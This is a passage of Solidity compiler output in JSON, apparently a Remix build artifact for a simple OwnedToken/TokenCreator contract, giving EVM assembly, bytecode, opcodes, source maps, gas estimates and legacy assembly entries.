not\n          and\n          swap1\n          dup4\n          0xffffffffffffffffffffffffffffffffffffffff\n          and\n          mul\n          or\n          swap1\n          sstore\n          pop\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":5141:5151  msg.sender */\n          caller\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":5118:5125  creator */\n          0x00\n          dup1\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":5118:5152  creator = TokenCreator(msg.sender) */\n          0x0100\n          exp\n          dup2\n          sload\n          dup2\n          0xffffffffffffffffffffffffffffffffffffffff\n          mul\n          not\n          and\n          swap1\n          dup4\n          0xffffffffffffffffffffffffffffffffffffffff\n          and\n          mul\n          or\n          swap1\n          sstore\n          pop\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":5170:5175  _name */\n          dup1\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":5163:5167  name */\n          0x02\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":5163:5175  name = _name */\n          dup2\n          swap1\n          sstore\n          pop\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":4481:5183  constructor(bytes32 _name) public{\r... */\n          pop\n            /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":3889:6975  contract OwnedToken {\r... */\n          dataSize(sub_0)\n          dup1\n          dataOffset(sub_0)\n          0x00\n          codecopy\n          0x00\n          return\n        stop\n\n        sub_0: assembly {\n                /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":3889:6975  contract OwnedToken {\r... */\n              mstore(0x40, 0x80)\n              callvalue\n                /* \"--CODEGEN--\":5:14   */\n              dup1\n                /* \"--CODEGEN--\":2:4   */\n              iszero\n              tag_1\n              jumpi\n                /* \"--CODEGEN--\":27:28   */\n              0x00\n                /* \"--CODEGEN--\":24:25   */\n              dup1\n                /* \"--CODEGEN--\":17:29   */\n              revert\n                /* \"--CODEGEN--\":2:4   */\n            tag_1:\n                /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":3889:6975  contract OwnedToken {\r... */\n              pop\n              jumpi(tag_2, lt(calldatasize, 0x04))\n              shr(0xe0, calldataload(0x00))\n              dup1\n              0x898855ed\n              eq\n              tag_3\n              jumpi\n            tag_2:\n                /* \"--CODEGEN--\":12:13   */\n              0x00\n                /* \"--CODEGEN--\":9:10   */\n              dup1\n                /* \"--CODEGEN--\":2:14   */\n              revert\n                /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":5191:6090  function changeName(bytes32 newName) public {\r... */\n            tag_3:\n              tag_4\n              0x04\n              dup1\n              calldatasize\n              sub\n                /* \"--CODEGEN--\":15:17   */\n              0x20\n                /* \"--CODEGEN--\":10:13   */\n              dup2\n                /* \"--CODEGEN--\":7:18   */\n              lt\n                /* \"--CODEGEN--\":4:6   */\n              iszero\n              tag_5\n              jumpi\n                /* \"--CODEGEN--\":31:32   */\n              0x00\n                /* \"--CODEGEN--\":28:29   */\n              dup1\n                /* \"--CODEGEN--\":21:33   */\n              revert\n                /* \"--CODEGEN--\":4:6   */\n            tag_5:\n                /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":5191:6090  function changeName(bytes32 newName) public {\r... */\n              dup2\n              add\n              swap1\n              dup1\n              dup1\n              calldataload\n              swap1\n              0x20\n              add\n              swap1\n              swap3\n              swap2\n              swap1\n              pop\n              pop\n              pop\n              tag_6\n              jump\t// in\n            tag_4:\n              stop\n            tag_6:\n                /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":6045:6052  creator */\n              0x00\n              dup1\n              swap1\n              sload\n              swap1\n              0x0100\n              exp\n              swap1\n              div\n              0xffffffffffffffffffffffffffffffffffffffff\n              and\n                /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":6023:6053  msg.sender == address(creator) */\n              0xffffffffffffffffffffffffffffffffffffffff\n              and\n                /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":6023:6033  msg.sender */\n              caller\n                /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":6023:6053  msg.sender == address(creator) */\n              0xffffffffffffffffffffffffffffffffffffffff\n              and\n              eq\n                /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":6019:6082  if (msg.sender == address(creator))\r... */\n              iszero\n              tag_8\n              jumpi\n                /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":6075:6082  newName */\n              dup1\n                /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":6068:6072  name */\n              0x02\n                /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":6068:6082  name = newName */\n              dup2\n              swap1\n              sstore\n              pop\n                /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":6019:6082  if (msg.sender == address(creator))\r... */\n            tag_8:\n                /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":5191:6090  function changeName(bytes32 newName) public {\r... */\n              pop\n              jump\t// out\n\n            auxdata: 0xa2646970667358221220864d2a7e09ec20b0c7c8c3c0390a6b726157753699d41d18ac2b760eb64d189664736f6c63430006060033\n        }\n    }\n\n    auxdata: 0xa26469706673582212200798ef6c2224810a3ce6b71d9d412a3b615920e2a8be6ac43de865fe3660fa6464736f6c63430006060033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b506103ae806100206000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80637379b4221461003b578063ae3edb6514610089575b600080fd5b6100876004803603604081101561005157600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506100f7565b005b6100b56004803603602081101561009f57600080fd5b8101908080359060200190929190505050610166565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b8173ffffffffffffffffffffffffffffffffffffffff1663898855ed826040518263ffffffff1660e01b815260040180828152602001915050600060405180830381600087803b15801561014a57600080fd5b505af115801561015e573d6000803e3d6000fd5b505050505050565b600081604051610175906101a3565b80828152602001915050604051809103906000f08015801561019b573d6000803e3d6000fd5b509050919050565b6101c8806101b18339019056fe608060405234801561001057600080fd5b506040516101c83803806101c88339818101604052602081101561003357600080fd5b810190808051906020019092919050505033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550806002819055505060ed806100db6000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c8063898855ed14602d575b600080fd5b605660048036036020811015604157600080fd5b81019080803590602001909291905050506058565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141560b457806002819055505b5056fea2646970667358221220864d2a7e09ec20b0c7c8c3c0390a6b726157753699d41d18ac2b760eb64d189664736f6c63430006060033a26469706673582212200798ef6c2224810a3ce6b71d9d412a3b615920e2a8be6ac43de865fe3660fa6464736f6c63430006060033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x3AE DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x7379B422 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0xAE3EDB65 EQ PUSH2 0x89 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x87 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x51 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0xF7 JUMP JUMPDEST STOP JUMPDEST PUSH2 0xB5 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x9F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x166 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x898855ED DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x14A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x15E JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 PUSH1 0x40 MLOAD PUSH2 0x175 SWAP1 PUSH2 0x1A3 JUMP JUMPDEST DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 PUSH1 0x0 CREATE DUP1 ISZERO DUP1 ISZERO PUSH2 0x19B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1C8 DUP1 PUSH2 0x1B1 DUP4 CODECOPY ADD SWAP1 JUMP INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x1C8 CODESIZE SUB DUP1 PUSH2 0x1C8 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x33 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP CALLER PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLER PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP1 PUSH1 0x2 DUP2 SWAP1 SSTORE POP POP PUSH1 0xED DUP1 PUSH2 0xDB PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x28 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x898855ED EQ PUSH1 0x2D JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x56 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH1 0x41 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH1 0x58 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH1 0xB4 JUMPI DUP1 PUSH1 0x2 DUP2 SWAP1 SSTORE POP JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 DUP7 0x4D 0x2A PUSH31 0x9EC20B0C7C8C3C0390A6B726157753699D41D18AC2B760EB64D189664736F PUSH13 0x63430006060033A26469706673 PC 0x22 SLT KECCAK256 SMOD SWAP9 0xEF PUSH13 0x2224810A3CE6B71D9D412A3B61 MSIZE KECCAK256 0xE2 0xA8 0xBE PUSH11 0xC43DE865FE3660FA646473 PUSH16 0x6C634300060600330000000000000000 ",
							"sourceMap": "7173:1825:4:-:0;;;;5:9:-1;2:2;;;27:1;24;17:12;2:2;7173:1825:4;;;;;;;"
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b50600436106100365760003560e01c80637379b4221461003b578063ae3edb6514610089575b600080fd5b6100876004803603604081101561005157600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506100f7565b005b6100b56004803603602081101561009f57600080fd5b8101908080359060200190929190505050610166565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b8173ffffffffffffffffffffffffffffffffffffffff1663898855ed826040518263ffffffff1660e01b815260040180828152602001915050600060405180830381600087803b15801561014a57600080fd5b505af115801561015e573d6000803e3d6000fd5b505050505050565b600081604051610175906101a3565b80828152602001915050604051809103906000f08015801561019b573d6000803e3d6000fd5b509050919050565b6101c8806101b18339019056fe608060405234801561001057600080fd5b506040516101c83803806101c88339818101604052602081101561003357600080fd5b810190808051906020019092919050505033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550806002819055505060ed806100db6000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c8063898855ed14602d575b600080fd5b605660048036036020811015604157600080fd5b81019080803590602001909291905050506058565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141560b457806002819055505b5056fea2646970667358221220864d2a7e09ec20b0c7c8c3c0390a6b726157753699d41d18ac2b760eb64d189664736f6c63430006060033a26469706673582212200798ef6c2224810a3ce6b71d9d412a3b615920e2a8be6ac43de865fe3660fa6464736f6c63430006060033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x7379B422 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0xAE3EDB65 EQ PUSH2 0x89 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x87 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x51 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0xF7 JUMP JUMPDEST STOP JUMPDEST PUSH2 0xB5 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x9F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x166 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x898855ED DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x14A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x15E JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 PUSH1 0x40 MLOAD PUSH2 0x175 SWAP1 PUSH2 0x1A3 JUMP JUMPDEST DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 PUSH1 0x0 CREATE DUP1 ISZERO DUP1 ISZERO PUSH2 0x19B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1C8 DUP1 PUSH2 0x1B1 DUP4 CODECOPY ADD SWAP1 JUMP INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x1C8 CODESIZE SUB DUP1 PUSH2 0x1C8 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x33 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP CALLER PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLER PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP1 PUSH1 0x2 DUP2 SWAP1 SSTORE POP POP PUSH1 0xED DUP1 PUSH2 0xDB PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x28 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x898855ED EQ PUSH1 0x2D JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x56 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH1 0x41 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH1 0x58 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH1 0xB4 JUMPI DUP1 PUSH1 0x2 DUP2 SWAP1 SSTORE POP JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 DUP7 0x4D 0x2A PUSH31 0x9EC20B0C7C8C3C0390A6B726157753699D41D18AC2B760EB64D189664736F PUSH13 0x63430006060033A26469706673 PC 0x22 SLT KECCAK256 SMOD SWAP9 0xEF PUSH13 0x2224810A3CE6B71D9D412A3B61 MSIZE KECCAK256 0xE2 0xA8 0xBE PUSH11 0xC43DE865FE3660FA646473 PUSH16 0x6C634300060600330000000000000000 ",
							"sourceMap": "7173:1825:4:-:0;;;;5:9:-1;2:2;;;27:1;24;17:12;2:2;7173:1825:4;;;;;;;;;;;;;;;;;;;;;12:1:-1;9;2:12;7748:424:4;;;;;;15:2:-1;10:3;7:11;4:2;;;31:1;28;21:12;4:2;7748:424:4;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;7202:538;;;;;;15:2:-1;10:3;7:11;4:2;;;31:1;28;21:12;4:2;7202:538:4;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;7748:424;8135:12;:23;;;8159:4;8135:29;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;5:9:-1;2:2;;;27:1;24;17:12;2:2;8135:29:4;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;8135:29:4;;;;7748:424;;:::o;7202:538::-;7269:23;7727:4;7712:20;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;7712:20:4;7705:27;;7202:538;;;:::o;7173:1825::-;;;;;;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "188400",
								"executionCost": "232",
								"totalCost": "188632"
							},
							"external": {
								"changeName(address,bytes32)": "infinite",
								"createToken(bytes32)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 7173,
									"end": 8998,
									"name": "PUSH",
									"source": 4,
									"value": "80"
								},
								{
									"begin": 7173,
									"end": 8998,
									"name": "PUSH",
									"source": 4,
									"value": "40"
								},
								{
									"begin": 7173,
									"end": 8998,
									"name": "MSTORE",
									"source": 4
								},
								{
									"begin": 7173,
									"end": 8998,
									"name": "CALLVALUE",
									"source": 4
								},
								{
									"begin": 5,
									"end": 14,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 2,
									"end": 4,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 27,
									"end": 28,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 24,
									"end": 25,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 17,
									"end": 29,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "tag",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 2,
									"end": 4,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 7173,
									"end": 8998,
									"name": "POP",
									"source": 4
								},
								{
									"begin": 7173,
									"end": 8998,
									"name": "PUSH #[$]",
									"source": 4,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 7173,
									"end": 8998,
									"name": "DUP1",
									"source": 4
								},
								{
									"begin": 7173,
									"end": 8998,
									"name": "PUSH [$]",
									"source": 4,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 7173,
									"end": 8998,
									"name": "PUSH",
									"source": 4,
									"value": "0"
								},
								{
									"begin": 7173,
									"end": 8998,
									"name": "CODECOPY",
									"source": 4
								},
								{
									"begin": 7173,
									"end": 8998,
									"name": "PUSH",
									"source": 4,
									"value": "0"
								},
								{
									"begin": 7173,
									"end": 8998,
									"name": "RETURN",
									"source": 4
								}
							],
							".data": {
								"0": {
									".auxdata": "a26469706673582212200798ef6c2224810a3ce6b71d9d412a3b615920e2a8be6ac43de865fe3660fa6464736f6c63430006060033",
									".code": [
										{
											"begin": 7173,
											"end": 8998,
											"name": "PUSH",
											"source": 4,
											"value": "80"
										},
										{
											"begin": 7173,
											"end": 8998,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 7173,
											"end": 8998,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 7173,
											"end": 8998,
											"name": "CALLVALUE",
											"source": 4
										},
										{
											"begin": 5,
											"end": 14,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "1"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 27,
											"end": 28,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 24,
											"end": 25,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 17,
											"end": 29,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"source": -1,
											"value": "1"
										},
										{
											"begin": 2,
